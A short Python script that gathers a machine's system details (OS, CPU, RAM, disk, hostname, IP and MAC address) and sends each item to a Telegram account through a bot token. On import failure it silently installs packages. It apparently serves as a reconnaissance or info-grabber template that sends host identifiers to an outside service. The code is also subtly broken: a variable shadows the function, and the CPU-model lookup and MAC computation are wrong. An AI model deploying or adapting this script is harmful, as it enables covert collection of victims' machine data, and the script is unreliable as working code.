uId = "" # replace with your tg uid
Token = "" # replce with your bot token

try:
    import os
    import platform
    import psutil
    import socket
    from os import system as s
    import cpuinfo
    from telebot import TeleBot as Bot
    import uuid
    from datetime import datetime
    import threading
except:
    s("pip install py-cpuinfo")
    s("pip install py-telegramBotAPI")


def get_system_info():
    system_info = {}

    system_info['Platform'] = platform.system()
    system_info['Platform Version'] = platform.version()
    system_info['Platform Release'] = platform.release()
    system_info['Architecture'] = platform.architecture()
    system_info['Machine'] = platform.machine()
    system_info['Processor'] = platform.processor()
    system_info['Node Name'] = platform.node()
    system_info['Uptime'] = str(datetime.now() - datetime.fromtimestamp(psutil.boot_time()))

    system_info['CPU Cores'] = psutil.cpu_count(logical=False)
    system_info['Logical CPUs'] = psutil.cpu_count(logical=True)
    system_info['CPU Frequency'] = psutil.cpu_freq().current
    system_info['CPU Usage'] = psutil.cpu_percent(interval=1)

    memory = psutil.virtual_memory()
    system_info['Total RAM'] = round(memory.total / (1024 * 1024 * 1024), 2)
    system_info['Available RAM'] = round(memory.available / (1024 * 1024 * 1024), 2)
    system_info['Used RAM'] = round(memory.used / (1024 * 1024 * 1024), 2)
    system_info['Memory Usage'] = memory.percent

    disk = psutil.disk_usage('/')
    system_info['Total Disk Space'] = round(disk.total / (1024 * 1024 * 1024), 2)
    system_info['Used Disk Space'] = round(disk.used / (1024 * 1024 * 1024), 2)
    system_info['Free Disk Space'] = round(disk.free / (1024 * 1024 * 1024), 2)
    system_info['Disk Usage'] = disk.percent

    system_info['IP Address'] = socket.gethostbyname(socket.gethostname())
    system_info['MAC Address'] = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 2)][::-1])

    system_info['OS Name'] = platform.system()
    system_info['OS Version'] = platform.version()
    system_info['OS Release'] = platform.release()

    try:
        system_info['CPU Model'] = cpuinfo.get_cpu_info()['cpuinfo']
    except Exception as e:
        system_info['CPU Model'] = str(e)

    return system_info

def send_message(msg):
    bot = Bot(Token) # Token
    bot.send_message(uId, msg) # uId

def system_info(info):
    threads = []
    for key, value in info.items():
        msg = f"{key}: {value}"
        thread = threading.Thread(target=send_message, args=(msg,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    system_info = get_system_info()
    system_info(system_info)
